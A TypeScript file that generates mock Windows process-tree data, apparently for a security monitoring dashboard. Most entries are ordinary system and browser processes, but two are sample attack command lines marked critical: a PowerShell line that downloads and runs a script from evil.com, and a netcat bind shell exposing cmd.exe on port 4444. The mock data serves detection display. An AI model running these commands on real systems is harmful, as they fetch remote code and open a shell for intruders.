export interface ProcessNode {
    pid: number;
    ppid: number;
    name: string;
    user: string;
    cmdline: string;
    riskLevel?: 'critical' | 'warning' | 'normal' | 'system';
    isSystem?: boolean;
    children?: ProcessNode[];
    timestamp?: string;
}

export const generateMockProcesses = (count: number = 20): ProcessNode[] => {
    const processes: ProcessNode[] = [];
    
    // 1. Root System Processes
    processes.push(
        { pid: 0, ppid: 0, name: 'System Idle Process', user: 'SYSTEM', cmdline: '', isSystem: true, riskLevel: 'system' },
        { pid: 4, ppid: 0, name: 'System', user: 'SYSTEM', cmdline: '', isSystem: true, riskLevel: 'system' }
    );

    // 2. Services
    const smss = { pid: 320, ppid: 4, name: 'smss.exe', user: 'SYSTEM', cmdline: 'C:\\Windows\\System32\\smss.exe', isSystem: true, riskLevel: 'system' };
    processes.push(smss);

    const csrss = { pid: 456, ppid: 320, name: 'csrss.exe', user: 'SYSTEM', cmdline: 'C:\\Windows\\System32\\csrss.exe', isSystem: true, riskLevel: 'system' };
    processes.push(csrss);

    const wininit = { pid: 520, ppid: 320, name: 'wininit.exe', user: 'SYSTEM', cmdline: 'C:\\Windows\\System32\\wininit.exe', isSystem: true, riskLevel: 'system' };
    processes.push(wininit);

    const services = { pid: 660, ppid: 520, name: 'services.exe', user: 'SYSTEM', cmdline: 'C:\\Windows\\System32\\services.exe', isSystem: true, riskLevel: 'system' };
    processes.push(services);

    // 3. Svchost instances
    for (let i = 0; i < 5; i++) {
        processes.push({
            pid: 1000 + i * 10,
            ppid: 660,
            name: 'svchost.exe',
            user: i % 2 === 0 ? 'NETWORK SERVICE' : 'LOCAL SERVICE',
            cmdline: `C:\\Windows\\System32\\svchost.exe -k ${i % 2 === 0 ? 'netsvcs' : 'localService'} -p`,
            isSystem: true,
            riskLevel: 'system'
        });
    }

    // 4. User Shell
    const explorer = { pid: 4500, ppid: 4, name: 'explorer.exe', user: 'Admin', cmdline: 'C:\\Windows\\explorer.exe', isSystem: false, riskLevel: 'normal' };
    processes.push(explorer);

    // 5. User Apps (Browser)
    const chrome = { pid: 5600, ppid: 4500, name: 'chrome.exe', user: 'Admin', cmdline: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', isSystem: false, riskLevel: 'normal' };
    processes.push(chrome);
    
    for (let i = 0; i < 4; i++) {
        processes.push({
            pid: 5601 + i,
            ppid: 5600,
            name: 'chrome.exe',
            user: 'Admin',
            cmdline: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer',
            isSystem: false,
            riskLevel: 'normal'
        });
    }

    // 6. Suspicious Activity (Mocking Attack)
    const powershell = { pid: 8888, ppid: 4500, name: 'powershell.exe', user: 'Admin', cmdline: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"', isSystem: false, riskLevel: 'critical' };
    processes.push(powershell);

    const nc = { pid: 9999, ppid: 8888, name: 'nc.exe', user: 'Admin', cmdline: 'nc.exe -lvvp 4444 -e cmd.exe', isSystem: false, riskLevel: 'critical' };
    processes.push(nc);

    return processes;
};
